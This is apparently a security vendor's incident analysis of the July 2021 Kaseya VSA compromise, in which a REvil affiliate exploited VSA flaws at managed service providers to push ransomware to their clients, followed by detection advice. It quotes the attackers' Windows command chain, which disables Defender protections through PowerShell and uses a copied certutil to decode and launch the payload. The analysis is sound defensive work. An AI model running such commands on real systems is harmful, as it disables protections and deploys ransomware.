Incident
Security / July 8, 2021
Joe Slowik &nbsp

Background
On July 2, 2021, software vendor Kaseya’s VSA remote monitoring and management tool
became the point of focus for an intrusion campaign impacting multiple managed service
providers (MSPs). While initially viewed as a software supply-chain intrusion (implying
compromise of Kaseya and modification of VSA packages), subsequent analysis identified
the intrusion sequence as exploitation of known but unpatched vulnerabilities in VSA,

followed by use of MSP privileged connections to clients to deliver REvil ransomware. REvil,
similar to DarkSide ransomware, operates via an affiliate model where attackers can operate
the malware.

Continuous updates from security firm Huntress as well as Kaseya itself indicated dozens of
VSA customers (MSPs) were impacted, leading to follow-on impacts at more than one
thousand entities linked to the impacted MSPs.
Affected entities ranged from a Swedish grocery chain that shuttered hundreds of locations
due to the incident, to several school systems in New Zealand.
While the impact of this incident will only become clear with more time, sufficient information
now exists to analyze precisely how this event took place, and how network defenders can
prepare for future, similar incidents should they occur.

Initial Delivery and Execution
Initial delivery and execution mechanisms for this incident relied on identification and
subsequent exploitation of vulnerabilities within the VSA platform. While initial reporting
suggested a potential breach at Kaseya leading to the distribution of malicious VSA updates,
subsequent analysis revealed this to not be the case. Instead, while the company’s software
was certainly impacted through the event, Kaseya itself appears to have avoided a breach of
its own network.

Rather than a software supply chain compromise, the incident instead reflects a services
supply chain incident. In this scenario, the adversary abuses trust relationships between
ultimate victims and MSPs in order to deploy a malicious capability.
Previous examples of service-focused supply chain activity include the CloudHopper
campaign and the Palmetto Fusion activity described by the U.S. government. At this time, it
is not clear whether the MSPs targeted in this incident were deliberate selections (for
example, based on the number or type of clients managed) or opportunistic identification of
entities running vulnerable and exposed VSA instances. On the latter point, Kaseya
repeatedly stated during response to this incident that only the on-premises version of VSA
was impacted by the vulnerabilities under discussion, while the software as a service (SaaS)
platform showed no evidence of exploitation.
Based on analysis from Huntress, enabled through data sharing from victim MSPs, initial
intrusion at MSP entities started by accessing an externally exposed VSA-related resource
— dl.asp — and abusing a flaw in that application’s authentication process. Once
authentication was circumvented, the intruders used built-in VSA functionality to upload at
least two files:
Agent.crt, an encoded REvil ransomware payload that would be distributed to MSP
clients
Screenshot.jpg, an executable masquerading as an image file designed to delete
relevant logs and other cleanup actions on impacted VSA instances
While upload of these items appears to have abused legitimate VSA functionality following
the authentication bypass noted above, actual process execution appears to rely on another
vulnerability, potentially SQL injection, via another exposed application,
userFilterTableRpt.asp. Through exploitation, the REvil affiliate would be able to achieve
command execution of the deployed payloads in the victim environment, leading to follow-on
infection stages described below.
As noted by Kaseya, the following HTTP GET and POST requests relate to the previouslydescribed activity:
POST: /dl.asp, /cgi-bin/KUpload.dll, /userFilterTableRpt.asp
GET: /done.asp

The above items in this specific incident were accessed by an entity potentially using the
command line tool cURL based on the User Agent “curl/7.69.1” in network logs and traffic.
While specific evidence is unavailable at the time of this writing, the above exploitation path
indicates the REvil affiliate involved was able to access VSA instances directly via an
external network connection. Review of VSA exposure through web scanning tools indicated

3/8

more than one thousand such instances were externally accessible at the time of the incident
(although significantly reduced since then), indicating a potential intrusion path while also
informing victim selection based purely on availability.

Subsequent Propagation to Victims
Once the intruder compromised MSP entities, they abused VSA characteristics to enable
follow-on distribution and execution of REvil ransomware in MSP customer environments.
The entity enabled this phase of operations through a combination of impersonating
legitimate VSA functionality for distribution and using Kaseya-prescribed antivirus directory
exclusions to evade (some) security solutions.
Based on reporting from multiple third parties, subsequent activity leverages the legitimate
Kaseya VSA update agent (agentmon.exe on local systems) to push a malicious update
object that drops an encoded file (agent.crt) to disk. The update agent then launches a series
of Windows commands for subsequent functionality on victim machines:
ping 127.0.0.1 -n <Parameter> >> nul &
%SystemDrive%\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference
-DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true DisableIOAVProtection $true -DisableScriptScanning $true EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force MAPSReporting Disabled -SubmitSamplesConsent NeverSend & copy /Y
%SystemDrive%\Windows\System32\certutil.exe %SystemDrive%\Windows\cert.exe & echo
%RANDOM% >>>> %SystemDrive%\Windows\cert.exe & %SystemDrive%\Windows\cert.exe -decode
<VSA Agent Directory>\agent.crt <VSA Agent Directory> \agent.exe & del /q /f <VSA
Agent Directory> \agent.crt %SystemDrive%\Windows\cert.exe & <VSA Agent
Directory>\agent.exe

The above breaks down to the following steps:
1. Establish a timer via the “ping” function to localhost, setting the number of pings to
roughly equal the amount of time between execution and 1630 UTC on 02 July 2021.
In this fashion, all payloads are synchronized to execute at approximately the same
time.
2. Use PowerShell to disable multiple security, prevention, and monitoring functions on
the victim machine.
3. Create a copy of the legitimate Windows binary “certutil.exe” in the Windows directory.
4. Use the copy of certutil to decode the “agent.crt” payload, save it as an executable,
then launch the program.
5. Remove artifacts (agent.crt, agent.exe, and the copy of certutil) from the victim host.

4/8

At the end of the above sequence, a REvil ransomware variant executes, resulting in
encryption of the host. Of note, while REvil contains the capability of “checking in” with
controllers (to send victim information and other statistics) via a list of domains within the
ransomware’s configuration, the specific REvil variants distributed in this campaign disabled
this functionality. As a result, network traffic from the ransomware execution is essentially
non-existent, with no observed Command and Control (C2) observables, or even (given the
distribution mechanism) artifacts related to lateral movement.

Detection and Defensive Possibilities
The above sequence of behaviors presents a vexing problem to network defenders,
especially for those representing ultimate victims for ransomware operations. Given the use
(and abuse) of otherwise legitimate, trusted network pathways, detection and mitigation
opportunities would appear limited. Yet, by reviewing how this operation took place, even
with only preliminary data and investigations ongoing, viable defensive strategies are
revealed. Through appropriate leveraging of available data sources, recognizing adversary
tradecraft, and applying this understanding to revealed anomalies in network observables,
defenders can formulate a plan to detect similar attack vectors in future encounters.

Intermediate Victim Opportunities
The REvil affiliate in this campaign breached MSPs using an unpatched vulnerability in
external-facing software. While the vulnerability aspect of matters presents a difficult to
address problem, as it was neither publicly disclosed nor was there a patch available, other
aspects of this initial intrusion pathway offer multiple detection and mitigation possibilities.
First, attack surface identification, and subsequent reduction, could remove or substantially
limit access to vulnerable resources (such as the VSA portal). While potentially limiting ease
and convenience of access, placing such a portal behind a virtual private network (VPN) or
other control significantly increases the difficulty of exploitation or even illicit authentication to
the resource. Identifying such resources and implementing appropriate security architecture
thus represents a powerful if not critical control that may have minimized risk of incidents
such as this REvil event. Furthermore, establishing such limits facilitates the creation of
network choke points that can enable further monitoring of environments and ensuring that
traffic of interest passes through sensors for analysis and response.
Second, the events in question reveal several anomalous items that are revealed through
network security monitoring (NSM) and analysis. For example, MSP compromise relies not
just on subverting authentication, but using this to enable upload of malicious payloads via
an authorized portal. Yet identifying or baselining what should be uploaded through such
applications can allow defenders to identify suspicious or outright malicious objects utilizing
this mechanism. Such an approach is especially rewarded in cases like “Screenshot.jpg,”
where a file object attempts to use a benign extension to mask a binary payload, and
“Agent.crt,” where an executable is transferred using a common encoding schema.

Third, various activities described previously, from authentication to upload to command
injection to achieve program execution, took place via a somewhat anomalous User Agent
belonging to the cURL utility. While cURL is a legitimate program, identifying this User Agent
associated with the network activities linked to ultimate REvil distribution is exceptionally
strange, and provides a potential alerting point for intrusions. Categorizing and appropriately
profiling communication metadata, especially linked to sensitive resources such as
interactive portals, or even HTTP commands such as POST associated with plaintext
commands or other observables, can assist in identifying activity for further investigation.

Ultimate Victim Defensive Measures
From the perspective of ultimate victims of this campaign, defensive measures are sadly
more limited. An organization adopting best practices from their vendor would be left almost
completely blind to potential exploitation given the use of a trusted network path (update
push from MSP VSA nodes) and requirements to curtail or eliminate security monitoring of
product directories.
Based on these observations, one of the first concrete actions defenders and asset owners
can take in this situation is to simply ignore (or at least refine) vendor recommendations.
Instead of allow-listing or omitting entire directories from security monitoring and response,
narrowly tailoring adjustments to match specific file names, file paths, and potentially even
file signatures could significantly reduce attack surface and minimize a malicious actor’s
ability to action a supply chain compromise. Such work is, however, arduous and has the risk
of breaking updates or other functionality. Yet, as examples like this incident and the previous
SolarWinds and Microsoft intrusion linked to Russian intelligence operations demonstrate,
the testing and analysis required to action such limits may be well worth the effort given the
increase in security by treating vendor updates with greater scrutiny.
From a network perspective, defenders are in a more limited state as services such as the
VSA update process will leverage implicitly-trusted, likely encrypted pathways for data
transfer. Yet as such trust-subverting intrusions become more common, organizations gain
greater incentive to apply further scrutiny to these relationships.
Through techniques such as SSL decryption and greater application of NSM practices to
even nominally-trusted communication pathways, defenders can potentially identify the initial
stages of an intrusion such as that employed by REvil operators in this incident. Looking for
communication artifacts or observables such as the transfer of encoded objects (like
“agent.crt”) or downloaded binary files without a known good, known expected signature can
serve as critical tripwires for defenders that matters are not what they seem, leading to a
response that curtails or prevents subsequent ransomware activity.

Conclusion

6/8

Supply chain-oriented intrusions, whether through products or services, are an increasing
threat to organizations. By adopting a more robust and complete posture with respect to
NSM and network detection and response (NDR), defenders can identify the precursors
associated with such activity (if they are a supplier of interest, in products or services), or
alterations in otherwise normal activity (if one is an end user).
By minimizing blind spots; increasing visibility into all traffic, including TLS inspection; and
analyzing communication streams, combined with thorough coverage of systems and
endpoints, defenders can layer defenses in such a fashion to detect or even defeat these
types of intrusions, whether their ultimate goal is ransomware deployment, as seen in this
incident, or espionage operations.
